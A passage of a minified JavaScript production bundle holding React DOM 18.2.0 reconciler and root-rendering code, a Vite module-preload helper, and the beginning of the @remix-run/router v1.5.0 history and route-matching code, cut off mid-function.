py(e)?1:0;if(null!=e){if((e=e.$$typeof)===bg)return 11;if(e===Og)return 14}return 2}function Ci(e,t){var n=e.alternate;return null===n?((n=zn(e.tag,t,e.key,e.mode)).elementType=e.elementType,n.type=e.type,n.stateNode=e.stateNode,n.alternate=e,e.alternate=n):(n.pendingProps=t,n.type=e.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=14680064&e.flags,n.childLanes=e.childLanes,n.lanes=e.lanes,n.child=e.child,n.memoizedProps=e.memoizedProps,n.memoizedState=e.memoizedState,n.updateQueue=e.updateQueue,t=e.dependencies,n.dependencies=null===t?null:{lanes:t.lanes,firstContext:t.firstContext},n.sibling=e.sibling,n.index=e.index,n.ref=e.ref,n}function Zc(e,t,n,r,i,s){var o=2;if(r=e,"function"==typeof e)py(e)&&(o=1);else if("string"==typeof e)o=5;else e:switch(e){case To:return Ns(n.children,i,s,t);case Ag:o=8,i|=8;break;case Fp:return(e=zn(12,n,t,2|i)).elementType=Fp,e.lanes=s,e;case Vp:return(e=zn(13,n,t,i)).elementType=Vp,e.lanes=s,e;case Up:return(e=zn(19,n,t,i)).elementType=Up,e.lanes=s,e;case m_:return Sd(n,i,s,t);default:if("object"==typeof e&&null!==e)switch(e.$$typeof){case f_:o=10;break e;case p_:o=9;break e;case bg:o=11;break e;case Og:o=14;break e;case ci:o=16,r=null;break e}throw Error(U(130,null==e?e:typeof e,""))}return(t=zn(o,n,t,i)).elementType=e,t.type=r,t.lanes=s,t}function Ns(e,t,n,r){return(e=zn(7,e,r,t)).lanes=n,e}function Sd(e,t,n,r){return(e=zn(22,e,r,t)).elementType=m_,e.lanes=n,e.stateNode={isHidden:!1},e}function ap(e,t,n){return(e=zn(6,e,null,t)).lanes=n,e}function lp(e,t,n){return(t=zn(4,null!==e.children?e.children:[],e.key,t)).lanes=n,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}function dA(e,t,n,r,i){this.tag=t,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Bf(0),this.expirationTimes=Bf(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Bf(0),this.identifierPrefix=r,this.onRecoverableError=i,this.mutableSourceEagerHydrationData=null}function my(e,t,n,r,i,s,o,a,l){return e=new dA(e,t,n,a,l),1===t?(t=1,!0===s&&(t|=8)):t=0,s=zn(3,null,null,t),e.current=s,s.stateNode=e,s.memoizedState={element:r,isDehydrated:n,cache:null,transitions:null,pendingSuspenseBoundaries:null},Jg(s),e}function fA(e,t,n){var r=3<arguments.length&&void 0!==arguments[3]?arguments[3]:null;return{$$typeof:Eo,key:null==r?null:""+r,children:e,containerInfo:t,implementation:n}}function a2(e){if(!e)return bi;e:{if(Qs(e=e._reactInternals)!==e||1!==e.tag)throw Error(U(170));var t=e;do{switch(t.tag){case 3:t=t.stateNode.context;break e;case 1:if(xn(t.type)){t=t.stateNode.__reactInternalMemoizedMergedChildContext;break e}}t=t.return}while(null!==t);throw Error(U(171))}if(1===e.tag){var n=e.type;if(xn(n))return oE(e,n,t)}return t}function l2(e,t,n,r,i,s,o,a,l){return(e=my(n,r,!0,e,i,s,o,a,l)).context=a2(null),n=e.current,(s=Ur(r=hn(),i=Di(n))).callback=t??null,Ii(n,s,i),e.current.lanes=i,vu(e,i,r),In(e,r),e}function _d(e,t,n,r){var i=t.current,s=hn(),o=Di(i);return n=a2(n),null===t.context?t.context=n:t.pendingContext=n,(t=Ur(s,o)).payload={element:e},null!==(r=void 0===r?null:r)&&(t.callback=r),null!==(e=Ii(i,t,o))&&(nr(e,i,o,s),Gc(e,i,o)),o}function Ah(e){if(!(e=e.current).child)return null;switch(e.child.tag){case 5:default:return e.child.stateNode}}function q1(e,t){if(null!==(e=e.memoizedState)&&null!==e.dehydrated){var n=e.retryLane;e.retryLane=0!==n&&n<t?n:t}}function gy(e,t){q1(e,t),(e=e.alternate)&&q1(e,t)}function pA(){return null}s2=function(e,t,n){if(null!==e)if(e.memoizedProps!==t.pendingProps||Tn.current)vn=!0;else{if(!(e.lanes&n||128&t.flags))return vn=!1,QR(e,t,n);vn=!!(131072&e.flags)}else vn=!1,Xe&&1048576&t.flags&&lE(t,_h,t.index);switch(t.lanes=0,t.tag){case 2:var r=t.type;Qc(e,t),e=t.pendingProps;var i=Ko(t,sn.current);zo(t,n),i=ry(null,t,r,e,i,n);var s=iy();return t.flags|=1,"object"==typeof i&&null!==i&&"function"==typeof i.render&&void 0===i.$$typeof?(t.tag=1,t.memoizedState=null,t.updateQueue=null,xn(r)?(s=!0,wh(t)):s=!1,t.memoizedState=null!==i.state&&void 0!==i.state?i.state:null,Jg(t),i.updater=gd,t.stateNode=i,i._reactInternals=t,pm(t,r,e,n),t=ym(null,t,r,!0,s,n)):(t.tag=0,Xe&&s&&Yg(t),an(null,t,i,n),t=t.child),t;case 16:r=t.elementType;e:{switch(Qc(e,t),e=t.pendingProps,r=(i=r._init)(r._payload),t.type=r,i=t.tag=hA(r),e=Xn(r,e),i){case 0:t=gm(null,t,r,e,n);break e;case 1:t=b1(null,t,r,e,n);break e;case 11:t=R1(null,t,r,e,n);break e;case 14:t=A1(null,t,r,Xn(r.type,e),n);break e}throw Error(U(306,r,""))}return t;case 0:return r=t.type,i=t.pendingProps,gm(e,t,r,i=t.elementType===r?i:Xn(r,i),n);case 1:return r=t.type,i=t.pendingProps,b1(e,t,r,i=t.elementType===r?i:Xn(r,i),n);case 3:e:{if(BE(t),null===e)throw Error(U(387));r=t.pendingProps,i=(s=t.memoizedState).element,dE(e,t),xh(t,r,null,n);var o=t.memoizedState;if(r=o.element,s.isDehydrated){if(s={element:r,isDehydrated:!1,cache:o.cache,pendingSuspenseBoundaries:o.pendingSuspenseBoundaries,transitions:o.transitions},t.updateQueue.baseState=s,t.memoizedState=s,256&t.flags){t=O1(e,t,r,n,i=Zo(Error(U(423)),t));break e}if(r!==i){t=O1(e,t,r,n,i=Zo(Error(U(424)),t));break e}for(Cn=xi(t.stateNode.containerInfo.firstChild),Nn=t,Xe=!0,Zn=null,n=gE(t,null,r,n),t.child=n;n;)n.flags=-3&n.flags|4096,n=n.sibling}else{if(Qo(),r===i){t=Wr(e,t,n);break e}an(e,t,r,n)}t=t.child}return t;case 5:return yE(t),null===e&&hm(t),r=t.type,i=t.pendingProps,s=null!==e?e.memoizedProps:null,o=i.children,om(r,i)?o=null:null!==s&&om(r,s)&&(t.flags|=32),zE(e,t),an(e,t,o,n),t.child;case 6:return null===e&&hm(t),null;case 13:return jE(e,t,n);case 4:return Zg(t,t.stateNode.containerInfo),r=t.pendingProps,null===e?t.child=Xo(t,null,r,n):an(e,t,r,n),t.child;case 11:return r=t.type,i=t.pendingProps,R1(e,t,r,i=t.elementType===r?i:Xn(r,i),n);case 7:return an(e,t,t.pendingProps,n),t.child;case 8:case 12:return an(e,t,t.pendingProps.children,n),t.child;case 10:e:{if(r=t.type._context,i=t.pendingProps,s=t.memoizedProps,o=i.value,ze(Eh,r._currentValue),r._currentValue=o,null!==s)if(rr(s.value,o)){if(s.children===i.children&&!Tn.current){t=Wr(e,t,n);break e}}else for(null!==(s=t.child)&&(s.return=t);null!==s;){var a=s.dependencies;if(null!==a){o=s.child;for(var l=a.firstContext;null!==l;){if(l.context===r){if(1===s.tag){(l=Ur(-1,n&-n)).tag=2;var u=s.updateQueue;if(null!==u){var c=(u=u.shared).pending;null===c?l.next=l:(l.next=c.next,c.next=l),u.pending=l}}s.lanes|=n,null!==(l=s.alternate)&&(l.lanes|=n),dm(s.return,n,t),a.lanes|=n;break}l=l.next}}else if(10===s.tag)o=s.type===t.type?null:s.child;else if(18===s.tag){if(null===(o=s.return))throw Error(U(341));o.lanes|=n,null!==(a=o.alternate)&&(a.lanes|=n),dm(o,n,t),o=s.sibling}else o=s.child;if(null!==o)o.return=s;else for(o=s;null!==o;){if(o===t){o=null;break}if(null!==(s=o.sibling)){s.return=o.return,o=s;break}o=o.return}s=o}an(e,t,i.children,n),t=t.child}return t;case 9:return i=t.type,r=t.pendingProps.children,zo(t,n),r=r(i=qn(i)),t.flags|=1,an(e,t,r,n),t.child;case 14:return i=Xn(r=t.type,t.pendingProps),A1(e,t,r,i=Xn(r.type,i),n);case 15:return VE(e,t,t.type,t.pendingProps,n);case 17:return r=t.type,i=t.pendingProps,i=t.elementType===r?i:Xn(r,i),Qc(e,t),t.tag=1,xn(r)?(e=!0,wh(t)):e=!1,zo(t,n),pE(t,r,i),pm(t,r,i,n),ym(null,t,r,!0,e,n);case 19:return qE(e,t,n);case 22:return UE(e,t,n)}throw Error(U(156,t.tag))};var u2="function"==typeof reportError?reportError:function(e){console.error(e)};function yy(e){this._internalRoot=e}function Ed(e){this._internalRoot=e}function vy(e){return!(!e||1!==e.nodeType&&9!==e.nodeType&&11!==e.nodeType)}function Td(e){return!(!e||1!==e.nodeType&&9!==e.nodeType&&11!==e.nodeType&&(8!==e.nodeType||" react-mount-point-unstable "!==e.nodeValue))}function Y1(){}function mA(e,t,n,r,i){if(i){if("function"==typeof r){var s=r;r=function(){var e=Ah(o);s.call(e)}}var o=l2(t,r,e,0,null,!1,!1,"",Y1);return e._reactRootContainer=o,e[qr]=o.current,zl(8===e.nodeType?e.parentNode:e),$s(),o}for(;i=e.lastChild;)e.removeChild(i);if("function"==typeof r){var a=r;r=function(){var e=Ah(l);a.call(e)}}var l=my(e,0,!1,null,null,!1,!1,"",Y1);return e._reactRootContainer=l,e[qr]=l.current,zl(8===e.nodeType?e.parentNode:e),$s((function(){_d(t,l,n,r)})),l}function xd(e,t,n,r,i){var s=n._reactRootContainer;if(s){var o=s;if("function"==typeof i){var a=i;i=function(){var e=Ah(o);a.call(e)}}_d(t,o,e,i)}else o=mA(n,t,e,i,r);return Ah(o)}Ed.prototype.render=yy.prototype.render=function(e){var t=this._internalRoot;if(null===t)throw Error(U(409));_d(e,t,null,null)},Ed.prototype.unmount=yy.prototype.unmount=function(){var e=this._internalRoot;if(null!==e){this._internalRoot=null;var t=e.containerInfo;$s((function(){_d(null,e,null,null)})),t[qr]=null}},Ed.prototype.unstable_scheduleHydration=function(e){if(e){var t=V_();e={blockedOn:null,target:e,priority:t};for(var n=0;n<di.length&&0!==t&&t<di[n].priority;n++);di.splice(n,0,e),0===n&&z_(e)}},L_=function(e){switch(e.tag){case 3:var t=e.stateNode;if(t.current.memoizedState.isDehydrated){var n=sl(t.pendingLanes);0!==n&&(Lg(t,1|n),In(t,pt()),!(6&Ie)&&(ea=pt()+500,Gi()))}break;case 13:$s((function(){var t=Yr(e,1);if(null!==t){var n=hn();nr(t,e,1,n)}})),gy(e,1)}},Fg=function(e){if(13===e.tag){var t=Yr(e,134217728);if(null!==t)nr(t,e,134217728,hn());gy(e,134217728)}},F_=function(e){if(13===e.tag){var t=Di(e),n=Yr(e,t);if(null!==n)nr(n,e,t,hn());gy(e,t)}},V_=function(){return be},U_=function(e,t){var n=be;try{return be=e,t()}finally{be=n}},Qp=function(e,t,n){switch(t){case"input":if(jp(e,n),t=n.name,"radio"===n.type&&null!=t){for(n=e;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+t)+'][type="radio"]'),t=0;t<n.length;t++){var r=n[t];if(r!==e&&r.form===e.form){var i=pd(r);if(!i)throw Error(U(90));y_(r),jp(r,i)}}}break;case"textarea":w_(e,n);break;case"select":null!=(t=n.value)&&Lo(e,!!n.multiple,t,!1)}},k_=hy,D_=$s;var gA={usingClientEntryPoint:!1,Events:[Su,Do,pd,x_,I_,hy]},Wa={findFiberByHostInstance:Ss,bundleType:0,version:"18.2.0",rendererPackageName:"react-dom"},yA={bundleType:Wa.bundleType,version:Wa.version,rendererPackageName:Wa.rendererPackageName,rendererConfig:Wa.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:Qr.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return null===(e=M_(e))?null:e.stateNode},findFiberByHostInstance:Wa.findFiberByHostInstance||pA,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.2.0-next-9e3b772b8-20220608"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Ic=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Ic.isDisabled&&Ic.supportsFiber)try{cd=Ic.inject(yA),gr=Ic}catch{}}function c2(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||"function"!=typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(c2)}catch(e){console.error(e)}}bn.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=gA,bn.createPortal=function(e,t){var n=2<arguments.length&&void 0!==arguments[2]?arguments[2]:null;if(!vy(t))throw Error(U(200));return fA(e,t,null,n)},bn.createRoot=function(e,t){if(!vy(e))throw Error(U(299));var n=!1,r="",i=u2;return null!=t&&(!0===t.unstable_strictMode&&(n=!0),void 0!==t.identifierPrefix&&(r=t.identifierPrefix),void 0!==t.onRecoverableError&&(i=t.onRecoverableError)),t=my(e,1,!1,null,null,n,!1,r,i),e[qr]=t.current,zl(8===e.nodeType?e.parentNode:e),new yy(t)},bn.findDOMNode=function(e){if(null==e)return null;if(1===e.nodeType)return e;var t=e._reactInternals;if(void 0===t)throw"function"==typeof e.render?Error(U(188)):(e=Object.keys(e).join(","),Error(U(268,e)));return e=null===(e=M_(t))?null:e.stateNode},bn.flushSync=function(e){return $s(e)},bn.hydrate=function(e,t,n){if(!Td(t))throw Error(U(200));return xd(null,e,t,!0,n)},bn.hydrateRoot=function(e,t,n){if(!vy(e))throw Error(U(405));var r=null!=n&&n.hydratedSources||null,i=!1,s="",o=u2;if(null!=n&&(!0===n.unstable_strictMode&&(i=!0),void 0!==n.identifierPrefix&&(s=n.identifierPrefix),void 0!==n.onRecoverableError&&(o=n.onRecoverableError)),t=l2(t,null,e,1,n??null,i,!1,s,o),e[qr]=t.current,zl(e),r)for(e=0;e<r.length;e++)i=(i=(n=r[e])._getVersion)(n._source),null==t.mutableSourceEagerHydrationData?t.mutableSourceEagerHydrationData=[n,i]:t.mutableSourceEagerHydrationData.push(n,i);return new Ed(t)},bn.render=function(e,t,n){if(!Td(t))throw Error(U(200));return xd(null,e,t,!1,n)},bn.unmountComponentAtNode=function(e){if(!Td(e))throw Error(U(40));return!!e._reactRootContainer&&($s((function(){xd(null,null,e,!1,(function(){e._reactRootContainer=null,e[qr]=null}))})),!0)},bn.unstable_batchedUpdates=hy,bn.unstable_renderSubtreeIntoContainer=function(e,t,n,r){if(!Td(n))throw Error(U(200));if(null==e||void 0===e._reactInternals)throw Error(U(38));return xd(e,t,n,!1,r)},bn.version="18.2.0-next-9e3b772b8-20220608",c2(),l_.exports=bn;var vA=l_.exports,W1=vA;$p.createRoot=W1.createRoot,$p.hydrateRoot=W1.hydrateRoot;const wA="modulepreload",SA=function(e){return"/"+e},G1={},_A=function(e,t,n){if(!t||0===t.length)return e();const r=document.getElementsByTagName("link");return Promise.all(t.map((e=>{if((e="/"+e)in G1)return;G1[e]=!0;const t=e.endsWith(".css"),i=t?'[rel="stylesheet"]':"";if(n)for(let n=r.length-1;n>=0;n--){const i=r[n];if(i.href===e&&(!t||"stylesheet"===i.rel))return}else if(document.querySelector(`link[href="${e}"]${i}`))return;const s=document.createElement("link");return s.rel=t?"stylesheet":wA,t||(s.as="script",s.crossOrigin=""),s.href=e,document.head.appendChild(s),t?new Promise(((t,n)=>{s.addEventListener("load",t),s.addEventListener("error",(()=>n(new Error(`Unable to preload CSS for ${e}`))))})):void 0}))).then((()=>e()))},EA=e=>{e&&e instanceof Function&&_A((()=>import("./web-vitals-bd683175.js")),[]).then((({getCLS:t,getFID:n,getFCP:r,getLCP:i,getTTFB:s})=>{t(e),n(e),r(e),i(e),s(e)}))};
/**
 * @remix-run/router v1.5.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function _e(){return(_e=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(e[r]=n[r])}return e}).apply(this,arguments)}var St;!function(e){e.Pop="POP",e.Push="PUSH",e.Replace="REPLACE"}(St||(St={}));const H1="popstate";function TA(e){return void 0===e&&(e={}),IA((function(e,t){let{pathname:n,search:r,hash:i}=e.location;return Ql("",{pathname:n,search:r,hash:i},t.state&&t.state.usr||null,t.state&&t.state.key||"default")}),(function(e,t){return"string"==typeof t?t:Gr(t)}),null,e)}function de(e,t){if(!1===e||null===e||typeof e>"u")throw new Error(t)}function ta(e,t){if(!e){typeof console<"u"&&console.warn(t);try{throw new Error(t)}catch{}}}function xA(){return Math.random().toString(36).substr(2,8)}function K1(e,t){return{usr:e.state,key:e.key,idx:t}}function Ql(e,t,n,r){return void 0===n&&(n=null),_e({pathname:"string"==typeof e?e:e.pathname,search:"",hash:""},"string"==typeof t?Xr(t):t,{state:n,key:t&&t.key||r||xA()})}function Gr(e){let{pathname:t="/",search:n="",hash:r=""}=e;return n&&"?"!==n&&(t+="?"===n.charAt(0)?n:"?"+n),r&&"#"!==r&&(t+="#"===r.charAt(0)?r:"#"+r),t}function Xr(e){let t={};if(e){let n=e.indexOf("#");n>=0&&(t.hash=e.substr(n),e=e.substr(0,n));let r=e.indexOf("?");r>=0&&(t.search=e.substr(r),e=e.substr(0,r)),e&&(t.pathname=e)}return t}function IA(e,t,n,r){void 0===r&&(r={});let{window:i=document.defaultView,v5Compat:s=!1}=r,o=i.history,a=St.Pop,l=null,u=c();function c(){return(o.state||{idx:null}).idx}function h(){a=St.Pop;let e=c(),t=null==e?null:e-u;u=e,l&&l({action:a,location:f.location,delta:t})}function d(e){let t="null"!==i.location.origin?i.location.origin:i.location.href,n="string"==typeof e?e:Gr(e);return de(t,"No window.location.(origin|href) available to create URL for href: "+n),new URL(n,t)}null==u&&(u=0,o.replaceState(_e({},o.state,{idx:u}),""));let f={get action(){return a},get location(){return e(i,o)},listen(e){if(l)throw new Error("A history only accepts one active listener");return i.addEventListener(H1,h),l=e,()=>{i.removeEventListener(H1,h),l=null}},createHref:e=>t(i,e),createURL:d,encodeLocation(e){let t=d(e);return{pathname:t.pathname,search:t.search,hash:t.hash}},push:function(e,t){a=St.Push;let r=Ql(f.location,e,t);n&&n(r,e),u=c()+1;let h=K1(r,u),d=f.createHref(r);try{o.pushState(h,"",d)}catch{i.location.assign(d)}s&&l&&l({action:a,location:f.location,delta:1})},replace:function(e,t){a=St.Replace;let r=Ql(f.location,e,t);n&&n(r,e),u=c();let i=K1(r,u),h=f.createHref(r);o.replaceState(i,"",h),s&&l&&l({action:a,location:f.location,delta:0})},go:e=>o.go(e)};return f}var It;!function(e){e.data="data",e.deferred="deferred",e.redirect="redirect",e.error="error"}(It||(It={}));const kA=new Set(["lazy","caseSensitive","path","id","index","children"]);function DA(e){return!0===e.index}function h2(e,t,n,r){return void 0===n&&(n=[]),void 0===r&&(r={}),e.map(((e,i)=>{let s=[...n,i],o="string"==typeof e.id?e.id:s.join("-");if(de(!0!==e.index||!e.children,"Cannot specify children on an index route"),de(!r[o],'Found a route id collision on id "'+o+"\".  Route id's must be globally unique within Data Router usages"),DA(e)){let n=_e({},e,{hasErrorBoundary:t(e),id:o});return r[o]=n,n}{let n=_e({},e,{id:o,hasErrorBoundary:t(e),children:void 0});return r[o]=n,e.children&&(n.children=h2(e.children,t,s,r)),n}}))}function Oo(e,t,n){void 0===n&&(n="/");let r=Eu(("string"==typeof t?Xr(t):t).pathname||"/",n);if(null==r)return null;let i=d2(e);CA(i);let s=null;for(let e=0;null==s&&e<i.length;++e)s=LA(i[e],UA(r));return s}function d2(e,t,n,r){void 0===t&&(t=[]),void 0===n&&(n=[]),void 0===r&&(r="");let i=(e,i,s)=>{let o={relativePath:void 0===s?e.path||"":s,caseSensitive:!0===e.caseSensitive,childrenIndex:i,route:e};o.relativePath.startsWith("/")&&(de(o.relativePath.startsWith(r),'Absolute route path "'+o.relativePath+'" nested under path "'+r+'" is not valid. An absolute child route path must start with the combined path of all its parent routes.'),o.relativePath=o.relativePath.slice(r.length));let a=zr([r,o.relativePath]),l=n.concat(o);e.children&&e.children.length>0&&(de(!0!==e.index,'Index routes must not have child routes. Please remove all child routes from route path "'+a+'".'),d2(e.children,t,l,a)),(null!=e.path||e.index)&&t.push({path:a,score:PA(a,e.index),routesMeta:l})};return e.forEach(((e,t)=>{var n;if(""!==e.path&&null!=(n=e.path)&&n.includes("?"))for(let n of f2(e.path))i(e,t,n);else i(e,t)})),t}function f2(e){let t=e.split("/");if(0===t.length)return[];let[n,...r]=t,i=n.endsWith("?"),s=n.replace(/\?$/,"");if(0===r.length)return i?[s,""]:[s];let o=f2(r.join("/")),a=[];return a.push(...o.map((e=>""===e?s:[s,e].join("/")))),i&&a.push(...o),a.map((t=>e.startsWith("/")&&""===t?"/":t))}function CA(e){e.sort(((e,t)=>e.score!==t.score?t.score-e.score:$A(e.routesMeta.map((e=>e.childrenIndex)),t.routesMeta.map((e=>e.childrenIndex)))))}const NA=/^:\w+$/,MA=3,RA=2,AA=1,bA=10,OA=-2,Q1=e=>"*"===e;function PA(e,t){let n=e.split("/"),r=n.length;return n.some(Q1)&&(r+=-2),t&&(r+=2),n.filter((e=>!Q1(e))).reduce(((e,t)=>e+(NA.test(t)?3:""===t?1:10)),r)}function $A(e,t){return e.length===t.length&&e.slice(0,-1).every(((e,n)=>e===t[n]))?e[e.length-1]-t[t.length-1]:0}function LA(e,t){let{routesMeta:n}=e,r={},i="/",s=[];for(let e=0;e<n.length;++e){let o=n[e],a=e===n.length-1,l="/"===i?t:t.slice(i.length)||"/",u=FA({path:o.relativePath,caseSensitive:o.caseSensitive,end:a},l);if(!u)return null;Object.assign(r,u.params);let c=o.route;s.push({params:r,pathname:zr([i,u.pathname]),pathnameBase:qA(zr([i,u.pathnameBase])),route:c}),"/"!==u.pathnameBase&&(i=zr([i,u.pathnameBase]))}return s}function FA(e,t){"string"==typeof e&&(e={path:e,caseSensitive:!1,end:!0});let[n,r]=VA(e.path,e.caseSensitive,e.end),i=t.match(n);if(!i)return null;let s=i[0],o=s.replace(/(.)\/+$/,"$1"),a=i.slice(1);return{params:r.reduce(((e,t,n)=>{if("*"===t){let e=a[n]||"";o=s.slice(0,s.length-e.length).replace(/(.)\/+$/,"$1")}return e[t]=zA(a[n]||"",t),e}),{}),pathname:s,pathnameBase:o,pattern:e}}function VA(e,t,n){void 0===t&&(t=!1),void 0===n&&(n=!0),ta("*"===e||!e.endsWith("*")||e.endsWith("/*"),'Route path "'+e+'" will be treated as if it were "'+e.replace(/\*$/,"/*")+'" because the `*` character must always follow a `/` in the pattern. To get rid of this warning, please change the route path to "'+e.replace(/\*$/,"/*")+'".');let r=[],i="^"+e.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^$?{}|()[\]]/g,"\\$&").replace(/\/:(\w+)/g,((e,t)=>(r.push(t),"/([^\\/]+)")));return e.endsWith("*")?(r.push("*"),i+="*"===e||"/*"===e?"(.*)$":"(?:\\/(.+)|\\/*)$"):n?i+="\\/*$":""!==e&&"/"!==e&&(i+="(?:(?=\\/|$))"),[new RegExp(i,t?void 0:"i"),r]}function UA(e){try{return decodeURI(e)}catch(t){return ta(!1,'The URL path "'+e+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent encoding ('+t+")."),e}}function zA(e,t){try{return decodeURIComponent(e)}catch(n){return ta(!1,'The value for the URL param "'+t+'" will not be decoded because the string "'+e+'" is a malformed URL segment. This is probably due to a bad percent encoding ('+n+")."),e}}function Eu(e,t){if("/"===t)return e;if(!e.toLowerCase().startsWith(t.toLowerCase()))return null;let n=t.endsWith("/")?t.length-1:t.length,r=e.charAt(n);return r&&"/"!==r?null:e.slice(n)||"/"}function BA(e,t){void 0===t&&(t="/");let{pathname:n,search:r="",hash:i=""}="string"==typeof e?Xr(e):e;return{pathname:n?n.startsWith("/")?n:jA(n,t):t,search:YA(r),hash:WA(i)}}function jA(e,t){let n=t.replace(/\/+$/,"").split("/");return e.split("/").forEach((e=>{".."===e?n.length>1&&n.pop():"."!==e&&n.push(e)})),n.length>1?n.join("/"):"/"}function up(e,t,n,r){return"Cannot include a '"+e+"' character in a manually specified `to."+t+"` field ["+JSON.stringify(r)+"].  Please separate it out to the `to."+n+'` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.'}function Id(e){return e.filter(((e,t)=>0===t||e.route.path&&e.route.path.length>0))}function wy(e,t,n,r){let i;void 0===r&&(r=!1),"string"==typeof e?i=Xr(e):(i=_e({},e),de(!i.pathname||!i.pathname.includes("?"),up("?","pathname","search",i)),de(!i.pathname||!i.pathname.includes("#"),up("#","pathname","hash",i)),de(!i.search||!i.search.includes("#"),up("#","search","hash",i)));let s,o=""===e||""===i.pathname,a=o?"/":i.pathname;if(r||null==a)s=n;else{let e=t.length-1;if(a.startsWith("..")){let t=a.split("/");for(;".."===t[0];)t.shift(),e-=1;i.pathname=t.join("/")}s=e>=0?t[e]:"/"}let l=BA(i,s),u=a&&"/"!==a&&a.endsWith("/"),c=(o||"."===a)&&n.endsWith("/");return!l.pathname.endsWith("/")&&(u||c)&&(l.pathname+="/"),l}const zr=e=>e.join("/").replace(/\/\/+/g,"/"),qA=e=>e.replace(/\/+$/,"").replace(/^\/*/,"/"),YA=e=>e&&"?"!==e?e.startsWith("?")?e:"?"+e:"",WA=e=>e&&"#"!==e?e.startsWith("#")?e:"#"+e:"";class Sy{constructor(e,t,n,r){void 0===r&&(r=!1),this.status=e,this.statusText=t||"",this.internal=r,n instanceof Error?(this.data=n.toString(),this.error=n):this.data=n}}function p2(e){return null!=e&&"number"==typeof e.status&&"string"==typeof e.statusText&&"boolean"==typeof e.internal&&"data"in e}const m2=["post","put","patch","delete"],GA=new Set(m2),HA=["get",...m2],KA=new Set(HA),QA=new Set([301,302,303,307,308]),XA=new Set([307,308]),cp={state:"idle",location:void 0,formMethod:void 0,formAction:void 0,formEncType:void 0,formData:void 0},JA={state:"idle",data:void 0,formMethod:void 0,formAction:void 0,formEncType:void 0,formData:void 0},X1={state:"unblocked",proceed:void 0,reset:void 0,location:void 0},g2=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,y2=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",ZA=!y2,eb=e=>!!e.hasErrorBoundary;function tb(e){de(e.routes.length>0,"You must provide a non-empty routes array to createRouter");let t,n=e.detectErrorBoundary||eb,r={},i=h2(e.routes,n,void 0,r),s=_e({v7_normalizeFormMethod:!1},e.future),o=null,a=new Set,l=null,u=null,c=null,h=null!=e.hydrationData,d=Oo(i,e.history.location,e.basename),f=null;if(null==d){let t=cr(404,{pathname:e.history.location.pathname}),{matches:n,route:r}=iw(i);d=n,f={[r.id]:t}}let p,m,g=!(d.some((e=>e.route.lazy))||d.some((e=>e.route.loader))&&null==e.hydrationData),y={historyAction:e.history.action,location:e.history.location,matches:d,initialized:g,navigation:cp,restoreScrollPosition:null==e.hydrationData&&null,preventScrollReset:!1,revalidation:"idle",loaderData:e.hydrationData&&e.hydrationData.loaderData||{},actionData:e.hydrationData&&e.hydrationData.actionData||null,errors:e.hydrationData&&e.hydrationData.errors||f,fetchers:new Map,blockers:new Map},v=St.Pop,w=!1,b=!1,_=!1,S=[],E=[],T=new Map,k=0,x=-1,I=new Map,C=new Set,D=new Map,M=new Map,N=new Map,A=!1;function L(e){y=_e({},y,e),a.forEach((e=>e(y)))}function O(n,r){var s,o;let a,l=null!=y.actionData&&null!=y.navigation.formMethod&&br(y.navigation.formMethod)&&"loading"===y.navigation.state&&!0!==(null==(s=n.state)?void 0:s._isRedirect);a=r.actionData?Object.keys(r.actionData).length>0?r.actionData:null:l?y.actionData:null;let u=r.loaderData?rw(y.loaderData,r.loaderData,r.matches||[],r.errors):y.loaderData;for(let[e]of N)G(e);let c=!0===w||null!=y.navigation.formMethod&&br(y.navigation.formMethod)&&!0!==(null==(o=n.state)?void 0:o._isRedirect);t&&(i=t,t=void 0),L(_e({},r,{actionData:a,loaderData:u,historyAction:v,location:n,initialized:!0,navigation:cp,revalidation:"idle",restoreScrollPosition:H(n,r.matches||y.matches),preventScrollReset:c,blockers:new Map(y.blockers)})),b||v===St.Pop||(v===St.Push?e.history.push(n,n.state):v===St.Replace&&e.history.replace(n,n.state)),v=St.Pop,w=!1,b=!1,_=!1,S=[],E=[]}async function R(s,o,a){m&&m.abort(),m=null,v=s,b=!0===(a&&a.startUninterruptedRevalidation),function(e,t){if(l&&u&&c){let n=t.map((e=>aw(e,y.loaderData))),r=u(e,n)||e.key;l[r]=c()}}(y.location,y.matches),w=!0===(a&&a.preventScrollReset);let h=t||i,d=a&&a.overrideNavigation,f=Oo(h,o,e.basename);if(!f){let e=cr(404,{pathname:o.pathname}),{matches:t,route:n}=iw(h);return Y(),void O(o,{matches:t,loaderData:{},errors:{[n.id]:e}})}if(ob(y.location,o)&&!(a&&a.submission&&br(a.submission.formMethod)))return void O(o,{matches:f});m=new AbortController;let 